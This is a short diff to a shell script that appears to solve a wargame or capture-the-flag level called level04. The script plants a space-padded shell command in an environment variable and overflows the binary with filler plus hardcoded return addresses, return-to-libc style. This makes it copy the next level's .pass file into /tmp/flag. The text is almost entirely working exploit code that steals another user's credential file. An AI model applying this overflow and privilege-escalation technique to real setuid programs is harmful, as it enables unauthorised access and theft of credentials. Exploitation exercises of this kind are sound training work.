@@ -13,10 +13,11 @@ cat /home/users/level05/.pass > /tmp/flag
 
 chmod +x /tmp/getflag.sh
 
+export toto=`python -c 'print(" "*4096 + "sh /tmp/getflag.sh")'`
+
 ADDRESS_OF_ENV="\x65\xd1\xff\xff"
 
 (python -c "print('2'*156 +  '\xd0\xae\xe6\xf7' + '\xe0\xeb\xe5\xb7' + $ADDRESS_OF_ENV)") | ./level04
 
-export toto=`python -c 'print(" "*4096 + "sh /tmp/getflag.sh")'`
 
 cat /tmp/flag
